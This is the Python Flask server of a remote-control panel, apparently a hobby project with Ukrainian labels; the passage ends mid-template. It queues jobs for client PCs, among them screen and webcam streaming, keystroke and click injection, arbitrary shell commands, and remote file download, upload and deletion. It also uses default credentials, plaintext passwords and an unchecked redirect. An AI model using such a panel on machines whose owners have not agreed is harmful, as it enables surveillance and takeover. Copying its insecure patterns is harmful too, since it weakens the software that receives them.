# -*- coding: utf-8 -*-
"""
Zlata z15 Stable Server

Stable Flask controller for z16_keyboard_fs_sync.py.

Client protocol:
  POST /api/heartbeat
  POST /api/upload_frame/<cid>
  POST /api/upload_camera/<cid>
  POST /api/job_result/<cid>/<job_id>

Supported client jobs:
  input_click, input_type, input_key, demo_prank, camera_photo,
  fs_list, fs_view, fs_download, fs_delete, fs_upload, command

Run:
  pip install flask
  python Zlata_z15_stable.py

Environment:
  REMOTE_USER            admin username, default: pro
  REMOTE_PASS            admin password, default: change-me
  REMOTE_CLIENT_TOKEN    must match the client token
  REMOTE_HOST            default: 0.0.0.0
  REMOTE_PORT            default: 5000
  FLASK_SECRET           random session secret
"""
from __future__ import annotations

import base64
import datetime as dt
import io
import json
import os
import threading
import time
import uuid
from functools import wraps
from pathlib import Path
from typing import Any

from flask import (
    Flask,
    Response,
    jsonify,
    redirect,
    render_template_string,
    request,
    send_file,
    session,
    url_for,
)

# ---------------------------------------------------------------------------
# CONFIG
# ---------------------------------------------------------------------------
APPDATA = os.environ.get("APPDATA") or os.path.join(Path.home(), ".config")
DATA_DIR = Path(os.environ.get("REMOTE_DATA_DIR", os.path.join(APPDATA, "RemoteNeon"))).expanduser()
DATA_DIR.mkdir(parents=True, exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
CHAT_FILE = DATA_DIR / "chat.json"
NOTIFS_FILE = DATA_DIR / "notifications.json"
MESSAGES_FILE = DATA_DIR / "messages.json"
CAMERA_DIR = DATA_DIR / "camera"
CAMERA_DIR.mkdir(parents=True, exist_ok=True)

ADMIN_USERNAME = os.environ.get("REMOTE_USER", "pro")
ADMIN_PASSWORD = os.environ.get("REMOTE_PASS", "change-me")
CLIENT_TOKEN = os.environ.get("REMOTE_CLIENT_TOKEN", "change-me-client-token")
SECRET_KEY = os.environ.get("FLASK_SECRET", "change-me-flask-secret")
HOST = os.environ.get("REMOTE_HOST", "0.0.0.0")
PORT = int(os.environ.get("REMOTE_PORT", "5000"))
ONLINE_TTL = 15
JOB_TTL = 300
MAX_FRAME = 4 * 1024 * 1024
MAX_RESULT_B64 = 14 * 1024 * 1024

THEMES = {
    "green": ("#00ffd0", "#4fbdb1"),
    "blue": ("#00c8ff", "#4fa6bd"),
    "red": ("#ff4d4d", "#bd4f4f"),
    "purple": ("#b84dff", "#9b4fbd"),
    "yellow": ("#ffe44d", "#bdb44f"),
    "pink": ("#ff4d9d", "#bd4f87"),
    "cyan": ("#00ffd6", "#4fbdb1"),
    "orange": ("#ff9f4d", "#bd8a4f"),
    "mint": ("#4dffb8", "#6fbda1"),
}
DEFAULT_THEME = "green"

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024

clients: dict[str, dict[str, Any]] = {}
clients_lock = threading.RLock()
data_lock = threading.RLock()


# ---------------------------------------------------------------------------
# STORAGE
# ---------------------------------------------------------------------------
def now_ts() -> str:
    return dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _ensure_json(path: Path, default: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    if not path.exists():
        path.write_text(json.dumps(default, ensure_ascii=False, indent=2), encoding="utf-8")


def load_json(path: Path, default: Any) -> Any:
    with data_lock:
        _ensure_json(path, default)
        try:
            value = json.loads(path.read_text(encoding="utf-8"))
            return value
        except Exception:
            return default


def save_json(path: Path, value: Any) -> None:
    with data_lock:
        path.parent.mkdir(parents=True, exist_ok=True)
        tmp = path.with_suffix(path.suffix + ".tmp")
        tmp.write_text(json.dumps(value, ensure_ascii=False, indent=2), encoding="utf-8")
        tmp.replace(path)


def load_users() -> dict[str, Any]:
    users = load_json(USERS_FILE, {})
    if not isinstance(users, dict):
        users = {}
    admin = users.get(ADMIN_USERNAME)
    if not isinstance(admin, dict):
        users[ADMIN_USERNAME] = {
            "password": ADMIN_PASSWORD,
            "permissions": ["admin", "screen", "files", "camera", "remote", "commands", "chat"],
        }
        save_json(USERS_FILE, users)
    return users


def add_notification(username: str, title: str, message: str) -> None:
    data = load_json(NOTIFS_FILE, {})
    if not isinstance(data, dict):
        data = {}
    items = data.setdefault(username, [])
    items.insert(0, {"ts": now_ts(), "title": title, "message": message})
    data[username] = items[:200]
    save_json(NOTIFS_FILE, data)


def chat_items() -> list[dict[str, str]]:
    data = load_json(CHAT_FILE, [])
    return data if isinstance(data, list) else []


def add_chat(username: str, message: str) -> None:
    message = str(message or "").strip()
    if not message:
        return
    items = chat_items()
    items.append({"user": username, "msg": message, "ts": now_ts()})
    save_json(CHAT_FILE, items[-5000:])


def message_items() -> dict[str, list[dict[str, str]]]:
    data = load_json(MESSAGES_FILE, {})
    return data if isinstance(data, dict) else {}


def add_message(to_user: str, from_user: str, message: str) -> None:
    data = message_items()
    data.setdefault(to_user, []).append({"from": from_user, "msg": message, "ts": now_ts()})
    data[to_user] = data[to_user][-500:]
    save_json(MESSAGES_FILE, data)


# ---------------------------------------------------------------------------
# AUTH / THEME
# ---------------------------------------------------------------------------
def login_required(fn):
    @wraps(fn)
    def wrapped(*args, **kwargs):
        if session.get("logged_in") is not True:
            return redirect(url_for("login", next=request.path))
        return fn(*args, **kwargs)

    return wrapped


def is_admin() -> bool:
    return session.get("username") == ADMIN_USERNAME


def has_perm(permission: str) -> bool:
    if is_admin():
        return True
    user = load_users().get(session.get("username"), {})
    return permission in user.get("permissions", [])


def deny(permission: str):
    if not has_perm(permission):
        return jsonify(ok=False, error=f"No access to {permission}"), 403
    return None


def theme_colors() -> tuple[str, str]:
    name = session.get("theme", DEFAULT_THEME)
    return THEMES.get(name, THEMES[DEFAULT_THEME])


# ---------------------------------------------------------------------------
# CLIENT STATE / JOBS
# ---------------------------------------------------------------------------
def client_token_ok() -> bool:
    return request.headers.get("X-Client-Token", "") == CLIENT_TOKEN


def client_online(c: dict[str, Any] | None) -> bool:
    return bool(c and (time.time() - float(c.get("last_seen", 0))) < ONLINE_TTL)


def get_client(cid: str) -> dict[str, Any] | None:
    with clients_lock:
        return clients.get(cid)


def selected_client() -> tuple[str | None, dict[str, Any] | None]:
    cid = session.get("selected_client")
    c = get_client(cid) if cid else None
    if client_online(c):
        return cid, c
    with clients_lock:
        online = [(k, v) for k, v in clients.items() if client_online(v)]
    if online:
        online.sort(key=lambda item: item[1].get("name", "").lower())
        session["selected_client"] = online[0][0]
        return online[0]
    return None, None


def require_selected() -> tuple[str, dict[str, Any]]:
    cid, c = selected_client()
    if not cid or not c:
        raise RuntimeError("No online z16 client selected")
    return cid, c


def cleanup_jobs_locked(c: dict[str, Any]) -> None:
    cutoff = time.time() - JOB_TTL
    c["jobs"] = [j for j in c.get("jobs", []) if float(j.get("created", 0)) >= cutoff]
    c["results"] = {
        jid: result
        for jid, result in c.get("results", {}).items()
        if float(result.get("_ts", time.time())) >= cutoff
    }


def queue_job(cid: str, action: str, **payload: Any) -> str:
    with clients_lock:
        c = clients.get(cid)
        if not client_online(c):
            raise RuntimeError("client offline")
        cleanup_jobs_locked(c)
        job_id = uuid.uuid4().hex
        c["jobs"].append({
            "id": job_id,
            "action": action,
            "payload": payload,
            "created": time.time(),
        })
        return job_id


def job_result(cid: str, job_id: str):
    with clients_lock:
        c = clients.get(cid)
        if not c:
            return None
        cleanup_jobs_locked(c)
        return c.get("results", {}).get(job_id)


def wait_job(cid: str, job_id: str, timeout: float = 20.0) -> dict[str, Any]:
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = job_result(cid, job_id)
        if result is not None:
            return {k: v for k, v in result.items() if k != "_ts"}
        time.sleep(0.2)
    return {"ok": False, "error": "job timeout"}


def queue_selected(action: str, **payload: Any) -> dict[str, Any]:
    try:
        cid, _ = require_selected()
        return {"ok": True, "job_id": queue_job(cid, action, **payload), "cid": cid}
    except RuntimeError as exc:
        return {"ok": False, "error": str(exc)}


# ---------------------------------------------------------------------------
# z16 PROTOCOL
# ---------------------------------------------------------------------------
@app.post("/api/heartbeat")
def heartbeat():
    if not client_token_ok():
        return jsonify(error="unauthorized"), 401
    data = request.get_json(silent=True) or {}
    cid = str(data.get("client_id", "")).strip()
    if not cid:
        return jsonify(error="client_id required"), 400

    with clients_lock:
        if cid not in clients:
            clients[cid] = {
                "name": "Unknown PC",
                "ip": "?",
                "last_seen": 0.0,
                "caps": [],
                "screen_frame": None,
                "camera_frame": None,
                "screen_viewed": 0.0,
                "camera_viewed": 0.0,
                "jobs": [],
                "results": {},
            }
        c = clients[cid]
        c["name"] = str(data.get("name") or c["name"])
        c["ip"] = request.remote_addr or c["ip"]
        c["caps"] = list(data.get("caps") or [])
        c["last_seen"] = time.time()
        c["cpu"] = data.get("cpu")
        c["ram"] = data.get("ram")
        c["stream_screen"] = (time.time() - float(c.get("screen_viewed", 0))) < 3
        c["stream_camera"] = (time.time() - float(c.get("camera_viewed", 0))) < 3
        jobs = list(c.get("jobs", []))
        c["jobs"] = []
        cleanup_jobs_locked(c)
        stream_screen = bool(c["stream_screen"])
        stream_camera = bool(c["stream_camera"])

    return jsonify(
        stream_screen=stream_screen,
        stream_camera=stream_camera,
        commands=jobs,
        server_ts=now_ts(),
    )


@app.post("/api/upload_frame/<cid>")
def upload_frame(cid: str):
    if not client_token_ok():
        return "unauthorized", 401
    data = request.get_data(cache=False)
    if len(data) > MAX_FRAME:
        return "frame too large", 413
    with clients_lock:
        c = clients.get(cid)
        if not c:
            return "unknown client", 404
        c["screen_frame"] = data
        c["last_seen"] = time.time()
    return "OK"


@app.post("/api/upload_camera/<cid>")
def upload_camera(cid: str):
    if not client_token_ok():
        return "unauthorized", 401
    data = request.get_data(cache=False)
    if len(data) > MAX_FRAME:
        return "frame too large", 413
    with clients_lock:
        c = clients.get(cid)
        if not c:
            return "unknown client", 404
        c["camera_frame"] = data
        c["last_seen"] = time.time()
    return "OK"


@app.post("/api/job_result/<cid>/<job_id>")
def upload_job_result(cid: str, job_id: str):
    if not client_token_ok():
        return "unauthorized", 401
    data = request.get_json(silent=True) or {}
    if isinstance(data.get("data_b64"), str) and len(data["data_b64"]) > MAX_RESULT_B64:
        return "result too large", 413
    with clients_lock:
        c = clients.get(cid)
        if not c:
            return "unknown client", 404
        value = dict(data)
        value["_ts"] = time.time()
        c["results"][job_id] = value
        cleanup_jobs_locked(c)
    return "OK"


def stream_generator(cid: str, camera: bool):
    frame_key = "camera_frame" if camera else "screen_frame"
    view_key = "camera_viewed" if camera else "screen_viewed"
    while True:
        with clients_lock:
            c = clients.get(cid)
            if not c:
                return
            c[view_key] = time.time()
            frame = c.get(frame_key)
            online = client_online(c)
        if not online:
            time.sleep(0.25)
            continue
        if frame:
            yield b"--frame\r\nContent-Type: image/jpeg\r\nCache-Control: no-cache\r\n\r\n" + frame + b"\r\n"
        time.sleep(0.05)


@app.get("/screen_feed")
@login_required
def screen_feed():
    if not has_perm("screen"):
        return jsonify(ok=False, error="No access to screen"), 403
    try:
        cid, _ = require_selected()
    except RuntimeError:
        return Response("No client", status=409, mimetype="text/plain")
    return Response(stream_generator(cid, False), mimetype="multipart/x-mixed-replace; boundary=frame")


@app.get("/camera_feed")
@login_required
def camera_feed():
    if not has_perm("camera"):
        return jsonify(ok=False, error="No access to camera"), 403
    try:
        cid, _ = require_selected()
    except RuntimeError:
        return Response("No client", status=409, mimetype="text/plain")
    return Response(stream_generator(cid, True), mimetype="multipart/x-mixed-replace; boundary=frame")


# ---------------------------------------------------------------------------
# LOGIN / CLIENT SELECTION
# ---------------------------------------------------------------------------
LOGIN_HTML = r"""
<!doctype html><html><head><meta charset="utf-8"><title>Neon Remote</title>
<style>
body{margin:0;background:#06060b;color:#00ffd0;font-family:Inter,Segoe UI,Arial;display:grid;place-items:center;height:100vh}
.box{width:min(420px,92vw);padding:28px;background:#0b0b12;border:1px solid #00ffd0;border-radius:12px;box-shadow:0 0 40px rgba(0,255,208,.18)}
input{width:100%;box-sizing:border-box;padding:11px;margin:7px 0;background:#071018;color:#0ff;border:1px solid #00ffd0;border-radius:7px}
button{width:100%;padding:11px;margin-top:8px;background:#001a1a;color:#0ff;border:1px solid #00ffd0;border-radius:7px;cursor:pointer}
.err{color:#ff7474}.small{font-size:12px;color:#8ff}
</style></head><body><div class="box"><h2>⚡ Neon Remote</h2><div class="small">z15 UI · z16 protocol</div>{% if msg %}<p class="err">{{msg}}</p>{% endif %}<form method="post"><input name="username" placeholder="Username" autocomplete="username"><input type="password" name="password" placeholder="Password" autocomplete="current-password"><button>Увійти</button></form></div></body></html>
"""


@app.route("/login", methods=["GET", "POST"])
def login():
    msg = ""
    users = load_users()
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        user = users.get(username)
        if not isinstance(user, dict) or password != user.get("password"):
            msg = "Невірні облікові дані"
            if username:
                add_notification(ADMIN_USERNAME, "Failed login", username)
        else:
            session.clear()
            session["logged_in"] = True
            session["username"] = username
            next_url = request.args.get("next") or url_for("index")
            return redirect(next_url)
    return render_template_string(LOGIN_HTML, msg=msg)


@app.get("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.post("/select_client")
@login_required
def select_client():
    cid = str(request.form.get("cid", "")).strip()
    c = get_client(cid)
    if not client_online(c):
        return redirect(url_for("index"))
    session["selected_client"] = cid
    return redirect(request.form.get("next") or url_for("index"))


@app.post("/set_theme")
@login_required
def set_theme():
    data = request.get_json(silent=True) or {}
    theme = data.get("theme") or request.form.get("theme")
    if theme not in THEMES:
        return jsonify(ok=False, error="unknown theme"), 400
    session["theme"] = theme
    if request.is_json:
        neon, muted = theme_colors()
        return jsonify(ok=True, theme=theme, neon=neon, muted=muted)
    return redirect(request.referrer or url_for("index"))


# ---------------------------------------------------------------------------
# API JOB ENDPOINTS
# ---------------------------------------------------------------------------
def queued_job_response(permission: str, action: str, **payload: Any):
    denial = deny(permission)
    if denial:
        return denial
    result = queue_selected(action, **payload)
    code = 200 if result.get("ok") else 409
    return jsonify(result), code


@app.post("/api/input/click")
@login_required
def api_input_click():
    data = request.get_json(silent=True) or {}
    click_type = str(data.get("type", "click"))
    if click_type not in {"click", "double", "right"}:
        return jsonify(ok=False, error="invalid click type"), 400
    return queued_job_response("remote", "input_click", x=data.get("x"), y=data.get("y"), type=click_type)


@app.post("/api/input/type")
@login_required
def api_input_type():
    data = request.get_json(silent=True) or {}
    text = str(data.get("text", ""))
    if len(text) > 4000:
        return jsonify(ok=False, error="text too long"), 400
    return queued_job_response("remote", "input_type", text=text)


@app.post("/api/input/key")
@login_required
def api_input_key():
    data = request.get_json(silent=True) or {}
    key = str(data.get("key", "")).strip()
    modifiers = data.get("modifiers") or []
    if not key or len(key) > 32 or not isinstance(modifiers, list):
        return jsonify(ok=False, error="invalid key payload"), 400
    return queued_job_response("remote", "input_key", key=key, modifiers=[str(x) for x in modifiers])


@app.post("/api/prank")
@login_required
def api_prank():
    # Only asks the already opt-in client for its harmless demo effect.
    data = request.get_json(silent=True) or {}
    effect = str(data.get("effect", "beep")).strip().lower()
    if effect != "beep":
        return jsonify(ok=False, error="Only the harmless beep demo is supported"), 400
    return queued_job_response("remote", "demo_prank", effect=effect)


@app.post("/api/command")
@login_required
def api_command():
    data = request.get_json(silent=True) or {}
    command = str(data.get("command", "")).strip()
    if not command:
        return jsonify(ok=False, error="empty command"), 400
    return queued_job_response("commands", "command", command=command)


@app.get("/job/<job_id>")
@login_required
def job_status(job_id: str):
    try:
        cid, _ = require_selected()
    except RuntimeError:
        return jsonify(done=False, error="no selected client"), 409
    result = job_result(cid, job_id)
    if result is None:
        return jsonify(done=False)
    return jsonify(done=True, result={k: v for k, v in result.items() if k != "_ts"})


@app.post("/api/camera/photo")
@login_required
def api_camera_photo():
    return queued_job_response("camera", "camera_photo")


# ---------------------------------------------------------------------------
# FILESYSTEM API
# ---------------------------------------------------------------------------
@app.get("/api/fs/list")
@login_required
def api_fs_list():
    return queued_job_response("files", "fs_list", path=request.args.get("path", ""))


@app.get("/api/fs/view")
@login_required
def api_fs_view():
    return queued_job_response("files", "fs_view", path=request.args.get("path", ""))


@app.get("/api/fs/download")
@login_required
def api_fs_download():
    return queued_job_response("files", "fs_download", path=request.args.get("path", ""))


@app.post("/api/fs/delete")
@login_required
def api_fs_delete():
    data = request.get_json(silent=True) or {}
    return queued_job_response("files", "fs_delete", path=data.get("path", ""))


@app.post("/api/fs/upload")
@login_required
def api_fs_upload():
    data = request.get_json(silent=True) or {}
    name = Path(str(data.get("name", ""))).name
    payload = str(data.get("data_b64", ""))
    if not name or not payload:
        return jsonify(ok=False, error="missing file"), 400
    if len(payload) > 11 * 1024 * 1024:
        return jsonify(ok=False, error="file too large"), 413
    return queued_job_response("files", "fs_upload", path=data.get("path", ""), name=name, data_b64=payload)


# ---------------------------------------------------------------------------
# UI TEMPLATES
# ---------------------------------------------------------------------------
BASE_STYLE = r"""
<style>
:root{--neon:{{ neon }};--muted:{{ muted }};--bg:#05060d;--panel:rgba(0,0,0,.35);--border:rgba(255,255,255,.08)}
*{box-sizing:border-box}body{margin:0;background:radial-gradient(circle at 15% 10%,rgba(0,255,208,.07),transparent 28%),var(--bg);color:var(--neon);font-family:Inter,Segoe UI,Arial}
a{color:var(--neon);text-decoration:none}.wrap{display:grid;grid-template-columns:1fr 340px;min-height:100vh}.main{padding:14px;overflow:auto}.right{padding:14px;border-left:1px solid var(--border)}
.card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:12px;margin-bottom:14px;box-shadow:0 8px 30px rgba(0,0,0,.22)}
.btn{border:1px solid var(--neon);background:transparent;color:var(--neon);padding:8px 14px;border-radius:8px;cursor:pointer}.btn:hover{background:var(--neon);color:#000;box-shadow:0 0 14px rgba(0,255,208,.15)}.danger{border-color:#ef4444;color:#ff8a8a}
.nav{position:fixed;left:0;top:0;width:240px;height:100vh;padding:14px;background:rgba(0,0,0,.92);transform:translateX(-100%);transition:.25s;z-index:100}.nav.open{transform:translateX(0)}.nav a{display:block;padding:10px;margin-bottom:8px;border:1px solid var(--border);border-radius:8px}.nav a:hover{border-color:var(--neon);background:rgba(0,255,208,.06)}
.screen{width:100%;display:block;background:#000;border-radius:8px;border:1px solid var(--border);min-height:220px;object-fit:contain}.small{color:#94a3b8;font-size:12px}.badge{display:inline-flex;align-items:center;gap:7px;padding:4px 9px;border-radius:999px;border:1px solid rgba(0,255,208,.2);background:rgba(0,255,208,.06);font-size:12px}.dot{width:8px;height:8px;border-radius:50%;background:var(--neon);box-shadow:0 0 9px var(--neon)}.dot.off{background:#ef4444;box-shadow:0 0 9px #ef4444}
.client{padding:10px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px}.client.selected{border-color:var(--neon)}input,select,textarea{width:100%;padding:9px;margin:5px 0;background:#020617;color:var(--neon);border:1px solid var(--border);border-radius:7px}textarea{min-height:110px}.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}.stat{display:flex;justify-content:space-between}.bar{height:9px;background:#111;border-radius:6px;overflow:hidden}.bar>div{height:100%;background:var(--neon)}
@media(max-width:1000px){.wrap{grid-template-columns:1fr}.right{border-left:0}}@media(max-width:700px){.right{padding-top:0}}
</style>
"""

SIDEBAR = r"""
<div class="nav" id="nav">
<a href="{{ url_for('index') }}">🏠 Головна</a>
{% if selected_cid %}<a href="{{ url_for('remote_page') }}">🎮 Remote</a><a href="{{ url_for('fullscreen_page') }}">🖥 Fullscreen</a><a href="{{ url_for('camera_page') }}">📷 Camera</a><a href="{{ url_for('files_page') }}">📁 File System</a>{% endif %}
<a href="{{ url_for('notifications_page') }}">🔔 Notifications</a><a href="{{ url_for('messages_page') }}">✉ Messages</a><a href="{{ url_for('chat_page') }}">💬 Chat</a>{% if username==admin_username %}<a href="{{ url_for('admin_users') }}">👥 Users</a>{% endif %}
<div class="card" style="margin-top:14px">{% for t in themes_list %}<button class="btn" style="padding:5px 8px" onclick="applyTheme('{{t}}')">{{t}}</button>{% endfor %}</div>
<a class="btn danger" style="display:inline-block;margin-top:6px" href="{{ url_for('logout') }}">🚪 Logout</a>
</div>
"""

MAIN_TEMPLATE = BASE_STYLE + SIDEBAR + r"""
<div class="wrap"><div class="main">
<div class="card row" style="justify-content:space-between"><div><b>⚡ Neon Remote</b><div class="small">z15 visual style · z16 stable protocol</div></div><button class="btn" onclick="document.getElementById('nav').classList.toggle('open')">☰ Menu</button></div>
<div class="card"><div class="row" style="justify-content:space-between"><div><b>Connected devices</b><div class="small">{{ pc_list|length }} known client(s)</div></div></div></div>
<div class="card">{% if selected %}<div class="row" style="justify-content:space-between"><div><h3 style="margin:0">🖥 {{selected.name}}</h3><div class="small">{{selected.ip}} · {{selected_cid}}</div></div><span class="badge"><span class="dot"></span> Online</span></div><img id="screen" class="screen" src="{{url_for('screen_feed')}}" style="margin-top:10px">{% else %}<div class="small">Запусти клиент `z16_keyboard_fs_sync.py` і перевір REMOTE_CLIENT_TOKEN.</div>{% endif %}</div>
{% if selected %}<div class="card"><b>Command</b><textarea id="cmd" placeholder="systeminfo / whoami / ..."></textarea><div class="row"><button class="btn" onclick="runCommand()">Run</button><a class="btn" href="{{url_for('remote_page')}}">Remote</a><a class="btn" href="{{url_for('fullscreen_page')}}">Fullscreen</a></div><pre id="cmdOut">{{cmd_output or '—'}}</pre></div>{% endif %}
</div>
<div class="right">
<div class="card"><b>Clients</b>{% for pc in pc_list %}<div class="client {{'selected' if pc.id==selected_cid else ''}}"><div class="row" style="justify-content:space-between"><b>{{pc.name}}</b><span class="badge"><span class="dot {{'' if pc.online else 'off'}}"></span>{{'Online' if pc.online else 'Offline'}}</span></div><div class="small">{{pc.ip}} · {{pc.id}}</div><div class="small">Caps: {{', '.join(pc.caps) or '—'}}</div>{% if pc.online %}<form method="post" action="{{url_for('select_client')}}"><input type="hidden" name="cid" value="{{pc.id}}"><button class="btn" type="submit">Select</button></form>{% endif %}</div>{% else %}<div class="small">No clients online.</div>{% endfor %}</div>
<div class="card"><div class="stat"><b>CPU</b><span>{{selected.cpu if selected and selected.cpu is not none else '—'}}{% if selected and selected.cpu is not none %}%{% endif %}</span></div><div class="bar"><div style="width:{{selected.cpu if selected and selected.cpu is not none else 0}}%"></div></div></div><div class="card"><div class="stat"><b>RAM</b><span>{{selected.ram if selected and selected.ram is not none else '—'}}{% if selected and selected.ram is not none %}%{% endif %}</span></div><div class="bar"><div style="width:{{selected.ram if selected and selected.ram is not none else 0}}%"></div></div></div>
</div></div>
<script>
async function applyTheme(t){const r=await fetch('{{url_for('set_theme')}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({theme:t})});if(r.ok)location.reload()}
async function runCommand(){const out=document.getElementById('cmdOut'),cmd=document.getElementById('cmd').value.trim();if(!cmd)return;out.textContent='⏳ sending...';const r=await fetch('{{url_for('api_command')}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd})});const q=await r.json();if(!q.ok){out.textContent=q.error||'error';return}for(let i=0;i<80;i++){const s=await fetch('{{url_for('job_status',job_id='JOB')}}'.replace('JOB',q.job_id));const d=await s.json();if(d.done){out.textContent=d.result.output||d.result.error||'—';return}await new Promise(x=>setTimeout(x,300))}out.textContent='job timeout'}
</script>
"""

REMOTE_TEMPLATE = BASE_STYLE + SIDEBAR + r"""
<div class="wrap"><div class="main"><div class="card row" style="justify-content:space-between"><div><b>🎮 Remote — {{pc_name}}</b><div class="small">{{cid}}</div></div><button class="btn" onclick="document.getElementById('nav').classList.toggle('open')">☰ Menu</button></div><div class="card"><img id="screen" class="screen" src="{{url_for('screen_feed')}}"><div class="small" style="margin-top:7px">Click on image to send coordinates.</div><div class="row" style="margin-top:8px"><button class="btn" onclick="sendClick('click')">Left Click</button><button class="btn" onclick="sendClick('double')">Double</button><button class="btn" onclick="sendClick('right')">Right</button><button class="btn" onclick="browserFs()">Fullscreen</button></div><textarea id="typebox" placeholder="Text to type"></textarea><button class="btn" onclick="sendText()">Send Text</button><div class="row" style="margin-top:8px"><input id="key" placeholder="Key, e.g. enter / esc / a" style="max-width:230px"><button class="btn" onclick="sendKey([])">Send Key</button><button class="btn" onclick="sendKey(['ctrl'])">Ctrl + Key</button><button class="btn" onclick="sendKey(['alt'])">Alt + Key</button></div><div class="row" style="margin-top:8px"><button class="btn" onclick="safePrank()">🔔 Safe Demo Beep</button></div><div id="status" class="small">Ready</div></div></div><div class="right"><div class="card"><b>Keyboard</b><div class="small">Raw key events are available only when client input is enabled.</div></div></div></div>
<script>
function browserFs(){const e=document.getElementById('screen');if(e.requestFullscreen)e.requestFullscreen()}
async function api(url,data){const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});return await r.json()}
async function sendClick(type){const img=document.getElementById('screen'),r=img.getBoundingClientRect(),sx=img.naturalWidth||r.width,sy=img.naturalHeight||r.height,x=Math.max(0,Math.round((event.clientX-r.left)*sx/r.width)),y=Math.max(0,Math.round((event.clientY-r.top)*sy/r.height));const d=await api('{{url_for('api_input_click')}}',{x,y,type});document.getElementById('status').textContent=d.ok?'✅ sent':(d.error||'error')}
async function sendText(){const d=await api('{{url_for('api_input_type')}}',{text:document.getElementById('typebox').value});document.getElementById('status').textContent=d.ok?'✅ sent':(d.error||'error')}
async function sendKey(modifiers){const key=document.getElementById('key').value.trim();if(!key)return;const d=await api('{{url_for('api_input_key')}}',{key,modifiers});document.getElementById('status').textContent=d.ok?'✅ sent':(d.error||'error')}
async function safePrank(){const d=await api('{{url_for('api_prank')}}',{effect:'beep'});document.getElementById('status').textContent=d.ok?'✅ beep sent':(d.error||'error')}
</script>
"""

FULLSCREEN_TEMPLATE = BASE_STYLE + r"""
<!doctype html><html><head><meta charset="utf-8"><title>Fullscreen</title></head><body style="overflow:hidden;background:#000"><img id="screen" src="{{url_for('screen_feed')}}" style="width:100vw;height:100vh;object-fit:contain;cursor:crosshair"><script>const i=document.getElementById('screen');async function clickSend(e,t){const r=i.getBoundingClientRect(),sx=i.naturalWidth||r.width,sy=i.naturalHeight||r.height,x=Math.round((e.clientX-r.left)*sx/r.width),y=Math.round((e.clientY-r.top)*sy/r.height);await fetch('{{url_for('fullscreen_click')}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({x,y,type:t})})}i.addEventListener('click',e=>clickSend(e,'click'));i.addEventListener('dblclick',e=>clickSend(e,'double'));</script></body></html>
"""

CAMERA_TEMPLATE = BASE_STYLE + SIDEBAR + r"""
<div class="wrap"><div class="main"><div class="card row" style="justify-content:space-between"><b>📷 Camera — {{pc_name}}</b><button class="btn" onclick="document.getElementById('nav').classList.toggle('open')">☰ Menu</button></div><div class="card"><img class="screen" src="{{url_for('camera_feed')}}"><div class="row" style="margin-top:8px"><button class="btn" onclick="takePhoto()">📸 Take photo</button><a class="btn" href="{{url_for('camera_gallery')}}">Gallery</a></div><div id="status" class="small" style="margin-top:8px">Ready</div><img id="out" class="screen" style="display:none;margin-top:10px"></div></div><div class="right"><div class="card"><b>Camera</b><div class="small">Stream comes from selected z16 client.</div></div></div></div>
<script>async function takePhoto(){const st=document.getElementById('status');st.textContent='⏳ capturing...';const r=await fetch('{{url_for('api_camera_photo')}}',{method:'POST'}),q=await r.json();if(!q.ok){st.textContent=q.error||'error';return}for(let i=0;i<80;i++){const s=await fetch('{{url_for('job_status',job_id='JOB')}}'.replace('JOB',q.job_id)),d=await s.json();if(d.done){if(!d.result.ok){st.textContent=d.result.error||'error';return}const bytes=Uint8Array.from(atob(d.result.data_b64),c=>c.charCodeAt(0));document.getElementById('out').src=URL.createObjectURL(new Blob([bytes],{type:'image/jpeg'}));document.getElementById('out').style.display='block';st.textContent='✅ done';return}await new Promise(x=>setTimeout(x,300))}st.textContent='timeout'}</script>
"""

FILES_TEMPLATE = BASE_STYLE + SIDEBAR + r"""
<div class="wrap"><div class="main"><div class="card row" style="justify-content:space-between"><div><b>📁 File System — {{pc_name}}</b><div class="small">{{selected_path or '/'}}</div></div><button class="btn" onclick="document.getElementById('nav').classList.toggle('open')">☰ Menu</button></div><div class="card"><div class="row"><input id="path" value="{{selected_path}}" placeholder="home / shared / projects..." style="flex:1"><button class="btn" onclick="loadFs()">Refresh</button></div><div id="fs" style="margin-top:10px">Loading...</div></div></div><div class="right"><div class="card"><b>Remote roots</b><div class="small">Roots are configured on the client with REMOTE_FS_ROOTS.</div></div></div></div>
<script>
async function waitJob(id){for(let i=0;i<80;i++){const r=await fetch('{{url_for('job_status',job_id='JOB')}}'.replace('JOB',id)),d=await r.json();if(d.done)return d.result;await new Promise(x=>setTimeout(x,250))}return {ok:false,error:'job timeout'}}
function esc(s){return String(s).replace(/[&<>\"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',"'":'&#039;'}[m]))}
async function loadFs(){const p=document.getElementById('path').value;const r=await fetch('{{url_for('api_fs_list')}}?path='+encodeURIComponent(p)),q=await r.json();if(!q.ok){document.getElementById('fs').textContent=q.error||'error';return}const d=await waitJob(q.job_id);if(!d.ok){document.getElementById('fs').textContent=d.error||'error';return}let h='';for(const f of d.items||[]){h+='<div class="client"><b>'+ (f.is_dir?'📂':'📄') +' '+esc(f.name)+'</b><div class="small">'+esc(f.mtime||'')+(f.size==null?'':' · '+esc(f.size))+'</div>'+(f.is_dir?'<button class="btn" onclick="document.getElementById(\'path\').value=\''+String(f.rel).replace(/'/g,"\\'")+'\';loadFs()">Open</button>':'')+'</div>'}document.getElementById('fs').innerHTML=h||'<div class="small">Empty</div>'}
loadFs();
</script>
"""

GENERIC_TEMPLATE = BASE_STYLE + SIDEBAR + r"""
<div class="wrap"><div class="main"><div class="card"><b>{{title}}</b></div>{% for item in items %}<div class="card">{{item|safe}}</div>{% else %}<div class="card">Empty</div>{% endfor %}</div><div class="right"></div></div>
